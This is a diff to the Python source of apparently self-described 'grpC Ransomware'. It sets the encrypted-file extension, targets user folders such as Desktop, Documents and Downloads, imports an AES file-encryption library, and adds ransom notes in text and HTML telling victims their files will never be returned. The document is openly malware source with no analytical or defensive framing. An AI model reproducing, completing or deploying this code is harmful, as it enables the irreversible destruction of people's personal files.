@@ -6,11 +6,26 @@ from hashlib import sha256, sha512
 from pyAesCrypt import encryptFile, decryptFile
 
 project_name = sys.argv[0]
-filext = ".GrpC"
+filext = ".grpC"
 filelimit = 1024 * 1024 * 1024 # 1 GB
 allowed_dirs = ["Desktop", "Documents", "Downloads", "Music", "Videos", "Pictures"]
 
 def createWarnings():
+    warningsTXT = """Oops your personal files have been encrypted :(
+
+If you see this text then it means that you have been infected by the grpC Ransomware
+
+Anyways this is not your regular Ransomware; wanna know why?
+
+It's because you are never getting your files back and IDGAF about your money in exchange for your files back, you might as well use it to get a new PC for yourself. Good day!"""
+    warningsHTML = """<h1>Oops your personal files have been encrypted :(</h1>
+<br> <br>
+If you see this text then it means that you have been infected by the grpC Ransomware
+<br> <br>
+Anyways this is not your regular Ransomware; wanna know why?
+<br> <br>
+It's because you are never getting your files back and IDGAF about your money in exchange for your files back, you might as well use it to get a new PC for yourself. Good day!"""
+
     username = os.path.expanduser("~")
     for dirs in allowed_dirs:
         with open(os.path.join(username, dirs, filext + " README.txt"), "w") as f:
